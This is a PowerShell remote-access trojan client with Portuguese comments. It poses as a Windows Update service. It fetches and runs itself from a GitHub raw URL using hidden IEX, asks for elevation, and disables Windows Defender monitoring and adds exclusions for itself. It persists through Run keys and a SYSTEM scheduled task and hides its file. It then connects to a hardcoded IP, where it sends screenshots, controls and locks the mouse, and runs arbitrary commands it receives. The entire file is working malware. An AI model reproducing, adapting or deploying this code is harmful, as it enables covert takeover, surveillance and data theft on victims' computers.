# cliente.ps1 — Configuração final para IEX
$serverIP = "198.1.195.204"
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

# ===== MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    try {
        # Re-executa via IEX com RunAs para pedir UAC
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue
    } catch {}
    exit
}

# ===== LOGS FAKES =====
Clear-Host
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host "    Microsoft Windows Critical System Component" -ForegroundColor Cyan
Write-Host "    Version 10.0.19045.1" -ForegroundColor Cyan
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "===============================================================" -ForegroundColor White
Write-Host "SISTEMA: $env:COMPUTERNAME@$env:USERNAME" -ForegroundColor Gray
Write-Host "OS: Microsoft Windows 10 Pro" -ForegroundColor Gray
Write-Host "CPU: $((Get-WmiObject Win32_Processor | Select-Object -First 1).Name)" -ForegroundColor Gray
$totalRAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
Write-Host "RAM: $totalRAM GB" -ForegroundColor Gray
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
Write-Host "IP: $ip" -ForegroundColor Gray
Write-Host "Admin: $isAdmin" -ForegroundColor Green
Write-Host "===============================================================" -ForegroundColor White
Start-Sleep -Seconds 2

# ===== DESABILITAR WINDOWS DEFENDER =====
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Caches" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
} catch {}

# ===== PERSISTÊNCIA =====
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
try {
    # Baixa a si mesmo do GitHub para persistir
    (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath)
} catch {}

try {
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
} catch {}

try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger1 = New-ScheduledTaskTrigger -AtLogOn
    $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)
    $trigger3 = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
    Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
} catch {}

attrib +h +s +r $scriptPath 2>$null

# ===== FUNÇÕES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-RATUsers { return "USUARIOS: $env:USERNAME" }
function Disable-Antivirus { return "ANTIVIRUS_DISABLED" }
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose(); $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch { return "SCREEN_ERROR" }
}

function Lock-Mouse {
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        while($true) {
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
            Start-Sleep -Milliseconds 10
        }
    } | Out-Null
    return "MOUSE_LOCKED"
}
function Unlock-Mouse {
    Get-Job | Where-Object { $_.State -eq 'Running' } | Stop-Job -ErrorAction SilentlyContinue
    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
    return "MOUSE_UNLOCKED"
}
function Move-Mouse {
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { return "MOUSE_ERROR" }
}
function Click-Mouse {
    try {
        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(long f, long x, long y, long d, long e);' -Name M -Namespace W
        [W.M]::mouse_event(0x02,0,0,0,0); [W.M]::mouse_event(0x04,0,0,0,0)
        return "OK"
    } catch { return "CLICK_ERROR" }
}
function Click-RightMouse {
    try {
        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(long f, long x, long y, long d, long e);' -Name MR -Namespace W
        [W.MR]::mouse_event(0x08,0,0,0,0); [W.MR]::mouse_event(0x10,0,0,0,0)
        return "OK"
    } catch { return "RIGHTCLICK_ERROR" }
}

# ===== CONEXAO =====
while ($true) {
    $client = $null; $stream = $null; $reader = $null; $writer = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($serverIP, $serverPort)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("BANNER:$env:COMPUTERNAME@$env:USERNAME|1920|1080|$isAdmin")
        
        while ($client.Connected) {
            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if ([string]::IsNullOrEmpty($cmd)) { Start-Sleep -Milliseconds 50; continue }
                
                $response = ""
                switch -Wildcard ($cmd) {
                    "screenshot" { $response = Get-ScreenCapture }
                    "lock_mouse" { $response = Lock-Mouse }
                    "unlock_mouse" { $response = Unlock-Mouse }
                    "click" { $response = Click-Mouse }
                    "rightclick" { $response = Click-RightMouse }
                    "test" { $response = "PONG" }
                    "exit" { $client.Close(); break }
                    "move *" { $p = $cmd -split " "; $response = Move-Mouse $p[1] $p[2] }
                    "exec *" { try { $response = Invoke-Expression ($cmd.Substring(5)) 2>&1 | Out-String } catch { $response = "ERR" } }
                    "ping" { $response = "PONG" }
                    default { $response = "UNKNOWN: $cmd" }
                }
                if ($response) { $writer.WriteLine($response); $writer.Flush() }
            } else {
                Start-Sleep -Milliseconds 50
            }
        }
    } catch {} finally {
        if ($reader) { $reader.Dispose() }
        if ($writer) { $writer.Dispose() }
        if ($stream) { $stream.Dispose() }
        if ($client) { $client.Close() }
    }
    Start-Sleep -Seconds 5
}
